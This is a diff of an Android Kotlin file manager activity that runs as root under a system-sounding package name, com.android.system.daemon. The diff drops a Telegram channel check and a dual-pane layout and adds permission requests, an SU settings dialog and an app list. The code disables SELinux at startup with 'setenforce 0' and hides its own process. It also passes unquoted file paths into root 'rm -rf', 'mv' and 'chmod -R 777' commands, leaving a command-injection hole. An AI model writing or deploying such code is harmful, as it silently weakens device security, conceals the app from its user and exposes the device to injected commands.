@@ -3,67 +3,98 @@ package com.android.system.daemon
 import android.app.Activity
 import android.app.AlertDialog
 import android.content.Intent
-import android.net.Uri
+import android.content.pm.ApplicationInfo
+import android.content.pm.PackageManager
 import android.os.Bundle
 import android.os.Environment
 import android.os.Handler
 import android.os.Looper
 import android.view.ContextMenu
+import android.view.Menu
 import android.view.MenuItem
 import android.view.View
 import android.widget.AdapterView
 import android.widget.ArrayAdapter
+import android.widget.EditText
 import android.widget.ListView
 import android.widget.TextView
 import android.widget.Toast
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import java.io.File
 import java.io.FileInputStream
 import java.io.FileOutputStream
-import java.net.HttpURLConnection
-import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.Locale
 import java.util.Date
 
 class MainActivity : Activity() {
 
-    private val tgChannelUrl = "https://t.me/HideMT"
-    private lateinit var leftListView: ListView
-    private lateinit var rightListView: ListView
-    private lateinit var leftPathText: TextView
-    private lateinit var rightPathText: TextView
+    private lateinit var filesListView: ListView
+    private lateinit var pathText: TextView
 
-    private var leftCurrentPath: String = "/"
-    private var rightCurrentPath: String = "/storage/emulated/0"
+    private var currentPath: String = "/"
     private var showHiddenFiles: Boolean = true
     private var showSystemFiles: Boolean = true
+    private var selectedFile: File? = null
 
-    private var leftSelectedFile: File? = null
-    private var rightSelectedFile: File? = null
+    private lateinit var suPathEditText: EditText
+    private val REQUEST_CODE_STORAGE_PERMISSIONS = 1001
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
         initView()
+        requestStoragePermissions()
         initFullRootAccess()
-        refreshLeftFileList()
-        refreshRightFileList()
+        refreshFileList()
 
+        // 移除TG验证，直接隐藏进程
         Handler(Looper.getMainLooper()).postDelayed({
-            startChannelVerify()
+            (application as App).hideSelfProcess()
         }, 1000)
     }
 
     private fun initView() {
-        leftListView = findViewById(R.id.lv_left)
-        rightListView = findViewById(R.id.lv_right)
-        leftPathText = findViewById(R.id.tv_left_path)
-        rightPathText = findViewById(R.id.tv_right_path)
+        filesListView = findViewById(R.id.lv_files)
+        pathText = findViewById(R.id.tv_path)
 
-        leftListView.onItemClickListener = leftItemClick
-        rightListView.onItemClickListener = rightItemClick
-        registerForContextMenu(leftListView)
-        registerForContextMenu(rightListView)
+        filesListView.onItemClickListener = itemClickListener
+        registerForContextMenu(filesListView)
+    }
+
+    private fun requestStoragePermissions() {
+        val permissions = mutableListOf<String>()
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            permissions.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            permissions.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
+        }
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
+                permissions.add(android.Manifest.permission.READ_MEDIA_IMAGES)
+            }
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
+                permissions.add(android.Manifest.permission.READ_MEDIA_VIDEO)
+            }
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                permissions.add(android.Manifest.permission.READ_MEDIA_AUDIO)
+            }
+        }
+        if (permissions.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), REQUEST_CODE_STORAGE_PERMISSIONS)
+        }
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == REQUEST_CODE_STORAGE_PERMISSIONS) {
+            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
+            if (!allGranted) {
+                Toast.makeText(this, "Storage permissions are required for full access", Toast.LENGTH_LONG).show()
+            }
+        }
     }
 
     private fun initFullRootAccess() {
@@ -76,28 +107,15 @@ class MainActivity : Activity() {
         app.execSu("setenforce 0")
     }
 
-    private val leftItemClick = AdapterView.OnItemClickListener { _, _, position, _ ->
-        val fileList = getFullFileList(leftCurrentPath)
+    private val itemClickListener = AdapterView.OnItemClickListener { _, _, position, _ ->
+        val fileList = getFullFileList(currentPath)
         if (position < fileList.size) {
             val target = fileList[position]
             if (target.isDirectory) {
-                leftCurrentPath = target.absolutePath
-                refreshLeftFileList()
+                currentPath = target.absolutePath
+                refreshFileList()
             } else {
-                leftSelectedFile = target
-            }
-        }
-    }
-
-    private val rightItemClick = AdapterView.OnItemClickListener { _, _, position, _ ->
-        val fileList = getFullFileList(rightCurrentPath)
-        if (position < fileList.size) {
-            val target = fileList[position]
-            if (target.isDirectory) {
-                rightCurrentPath = target.absolutePath
-                refreshRightFileList()
-            } else {
-                rightSelectedFile = target
+                selectedFile = target
             }
         }
     }
@@ -131,9 +149,9 @@ class MainActivity : Activity() {
         app.execSu("chown 0:0 ${dir.absolutePath}")
     }
 
-    private fun refreshLeftFileList() {
-        leftPathText.text = leftCurrentPath
-        val files = getFullFileList(leftCurrentPath)
+    private fun refreshFileList() {
+        pathText.text = currentPath
+        val files = getFullFileList(currentPath)
         val displayList = files.map {
             when {
                 it.isDirectory -> "[Dir] ${it.name}"
@@ -142,21 +160,70 @@ class MainActivity : Activity() {
             }
         }
         val adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, displayList)
-        leftListView.adapter = adapter
+        filesListView.adapter = adapter
     }
 
-    private fun refreshRightFileList() {
-        rightPathText.text = rightCurrentPath
-        val files = getFullFileList(rightCurrentPath)
-        val displayList = files.map {
-            when {
-                it.isDirectory -> "[Dir] ${it.name}"
-                it.isHidden -> "[Hidden] ${it.name}"
-                else -> it.name
+    override fun onCreateOptionsMenu(menu: Menu): Boolean {
+        menuInflater.inflate(R.menu.main_menu, menu)
+        return true
+    }
+
+    override fun onOptionsItemSelected(item: MenuItem): Boolean {
+        return when (item.itemId) {
+            R.id.action_settings -> {
+                showSettingsDialog()
+                true
             }
+            R.id.action_app_list -> {
+                showInstalledAppsList()
+                true
+            }
+            else -> super.onOptionsItemSelected(item)
         }
-        val adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, displayList)
-        rightListView.adapter = adapter
+    }
+
+    private fun showSettingsDialog() {
+        val app = application as App
+        val dialogView = layoutInflater.inflate(R.layout.settings_dialog, null)
+        suPathEditText = dialogView.findViewById(R.id.et_su_path)
+        suPathEditText.setText(app.customSuCmd)
+
+        AlertDialog.Builder(this)
+            .setTitle("Settings")
+            .setView(dialogView)
+            .setPositiveButton("Save") { _, _ ->
+                val newSuPath = suPathEditText.text.toString().trim()
+                if (newSuPath.isNotBlank()) {
+                    app.customSuCmd = newSuPath
+                    Toast.makeText(this, "SU path saved", Toast.LENGTH_SHORT).show()
+                } else {
+                    Toast.makeText(this, "SU path cannot be empty", Toast.LENGTH_SHORT).show()
+                }
+            }
+            .setNeutralButton("Reset") { _, _ ->
+                app.customSuCmd = ""
+                suPathEditText.setText("")
+                Toast.makeText(this, "SU path reset to auto-detect", Toast.LENGTH_SHORT).show()
+            }
+            .setNegativeButton("Cancel", null)
+            .show()
+    }
+
+    private fun showInstalledAppsList() {
+        val packageManager = packageManager
+        val apps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
+        val appNames = apps.map { it.loadLabel(packageManager).toString() }.toMutableList()
+        val appPackages = apps.map { it.packageName }.toMutableList()
+
+        AlertDialog.Builder(this)
+            .setTitle("Installed Applications")
+            .setItems(appNames.toTypedArray()) { _, position ->
+                val appName = appNames[position]
+                val packageName = appPackages[position]
+                Toast.makeText(this, "Selected: $appName\nPackage: $packageName", Toast.LENGTH_LONG).show()
+            }
+            .setNegativeButton("Close", null)
+            .show()
     }
 
     override fun onCreateContextMenu(menu: ContextMenu?, v: View?, menuInfo: ContextMenu.ContextMenuInfo?) {
@@ -175,13 +242,11 @@ class MainActivity : Activity() {
         when (item.title) {
             "Show Hidden Files" -> {
                 showHiddenFiles = !showHiddenFiles
-                refreshLeftFileList()
-                refreshRightFileList()
+                refreshFileList()
             }
             "Show System Files" -> {
                 showSystemFiles = !showSystemFiles
-                refreshLeftFileList()
-                refreshRightFileList()
+                refreshFileList()
             }
             "Copy" -> copySelectedFile()
             "Move" -> moveSelectedFile()
@@ -194,49 +259,47 @@ class MainActivity : Activity() {
     }
 
     private fun copySelectedFile() {
-        val source = leftSelectedFile ?: return
-        val targetDir = File(rightCurrentPath)
+        val source = selectedFile ?: return
+        val targetDir = File(currentPath)
         Thread {
             runCatching {
                 copyRecursive(source, File(targetDir, source.name))
-                runOnUiThread { refreshRightFileList() }
+                runOnUiThread { refreshFileList() }
             }
         }.start()
     }
 
     private fun moveSelectedFile() {
-        val source = leftSelectedFile ?: return
-        val target = File(rightCurrentPath, source.name)
+        val source = selectedFile ?: return
+        val target = File(currentPath, source.name)
         val app = application as App
         app.execSu("mv -f ${source.absolutePath} ${target.absolutePath}")
-        refreshLeftFileList()
-        refreshRightFileList()
+        refreshFileList()
     }
 
     private fun deleteSelectedFile() {
-        val target = leftSelectedFile ?: rightSelectedFile ?: return
+        val target = selectedFile ?: return
         val app = application as App
         app.execSu("rm -rf ${target.absolutePath}")
-        refreshLeftFileList()
-        refreshRightFileList()
+        refreshFileList()
     }
 
     private fun renameSelectedFile() {
-        val target = leftSelectedFile ?: return
+        val target = selectedFile ?: return
         val app = application as App
         val newName = System.currentTimeMillis().toString()
         app.execSu("mv ${target.absolutePath} ${target.parent}/$newName")
-        refreshLeftFileList()
+        refreshFileList()
     }
 
     private fun chmodSelectedFile() {
-        val target = leftSelectedFile ?: return
+        val target = selectedFile ?: return
         val app = application as App
         app.execSu("chmod -R 777 ${target.absolutePath}")
     }
 
     private fun showFileDetails() {
-        val target = leftSelectedFile ?: return
+        val target = selectedFile ?: return
         val size = target.length()
         val modifyTime = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.ENGLISH)
             .format(Date(target.lastModified()))
@@ -269,64 +332,11 @@ class MainActivity : Activity() {
         }
     }
 
-    private fun startChannelVerify() {
-        val verifyDialog = AlertDialog.Builder(this)
-            .setTitle("Channel Verify")
-            .setMessage("Required channel:$tgChannelUrl\nChecking...")
-            .setCancelable(false)
-            .create()
-        verifyDialog.show()
-
-        Thread {
-            val isJoined = runCatching {
-                val conn = URL(tgChannelUrl).openConnection() as HttpURLConnection
-                conn.requestMethod = "GET"
-                conn.connectTimeout = 3000
-                conn.readTimeout = 3000
-                val content = conn.inputStream.bufferedReader().readText()
-                conn.disconnect()
-                content.contains("Only members can view")
-            }.getOrDefault(true)
-
-            runOnUiThread {
-                verifyDialog.dismiss()
-                if (!isJoined) {
-                    showBlockDialog()
-                } else {
-                    (application as App).hideSelfProcess()
-                }
-            }
-        }.start()
-    }
-
-    private fun showBlockDialog() {
-        AlertDialog.Builder(this)
-            .setTitle("Verify Failed")
-            .setMessage("Please join official channel first")
-            .setPositiveButton("Join Now") { _, _ ->
-                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(tgChannelUrl)))
-                finishAndRemoveTask()
-            }
-            .setNegativeButton("Exit") { _, _ ->
-                finishAndRemoveTask()
-            }
-            .setCancelable(false)
-            .show()
-    }
-
-    private fun toast(text: String) {
-        Toast.makeText(this, text, Toast.LENGTH_SHORT).show()
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-    }
-
     override fun onBackPressed() {
-        val parentFile = File(leftCurrentPath).parentFile
-        if (parentFile != null && leftCurrentPath != "/") {
-            leftCurrentPath = parentFile.absolutePath
-            refreshLeftFileList()
+        val parentFile = File(currentPath).parentFile
+        if (parentFile != null && currentPath != "/") {
+            currentPath = parentFile.absolutePath
+            refreshFileList()
         } else {
             finishAndRemoveTask()
         }
